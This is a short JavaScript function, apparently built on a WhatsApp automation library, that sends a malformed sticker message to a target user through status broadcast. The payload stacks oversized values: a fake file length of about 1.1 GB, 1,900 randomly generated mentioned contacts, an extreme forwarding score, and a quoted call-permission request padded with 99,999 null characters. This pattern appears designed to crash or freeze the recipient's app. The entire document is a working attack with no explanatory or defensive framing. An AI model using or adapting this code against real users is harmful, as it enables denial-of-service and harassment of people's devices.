async function HorleyNavise(sock, jid) {
    const Sticker = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/webp",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "1173741824",
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    isAnimated: false,
                    viewOnce: false,
                    contextInfo: {
                        mentionedJid: [
                            jid,
                            ...Array.from({ length: 1900 }, () =>
                                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: { text: "🇷🇺", format: "DEFAULT" },
                                        nativeFlowResponseMessage: {
                                            name: "call_permission_request",
                                            paramsJson: "\u0000".repeat(99999),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(jid, Sticker, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}